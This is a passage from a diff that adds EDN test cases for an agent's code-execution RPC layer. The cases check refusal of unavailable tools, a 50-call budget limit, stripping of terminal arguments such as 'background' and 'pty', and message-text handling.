+   :expect {:value "{\"error\":\"Tool 'web_search' is not available in execute_code. Available: terminal\"}"}}
+  {:id :rpc/refuse-budget :op :code-rpc
+   :call ["refusal" ["terminal"] "terminal" 50 50]
+   :expect {:value "{\"error\":\"Tool call limit reached (50). No more tool calls allowed in this execution.\"}"}}
+  {:id :rpc/refuse-order :op :code-rpc
+   :call ["refusal" ["terminal"] "web_search" 99 50]
+   :expect {:value "{\"error\":\"Tool 'web_search' is not available in execute_code. Available: terminal\"}"}}
+  {:id :rpc/term-strip :op :code-rpc
+   :call ["terminal-args" "terminal" {"command" "x" "background" true "pty" false}]
+   :expect {:value {"command" "x"}}}
+  {:id :rpc/term-keep :op :code-rpc
+   :call ["terminal-args" "terminal" {"command" "x" "timeout" 5}]
+   :expect {:value {"command" "x" "timeout" 5}}}
+  {:id :rpc/term-nonmap :op :code-rpc
+   :call ["terminal-args" "terminal" "oops"]
+   :expect {:value {}}}
+  {:id :rpc/term-other :op :code-rpc
+   :call ["terminal-args" "read_file" {"background" true}]
+   :expect {:value {"background" true}}}
+  {:id :rpc/msg-text :op :code-rpc
+   :call ["message-text" "boom"]
+   :expect {:value "boom"}}
+  {:id :rpc/msg-empty :op :code-rpc
+   :call ["message-text" ""]
+   :expect {:value ""}}
 ]}]
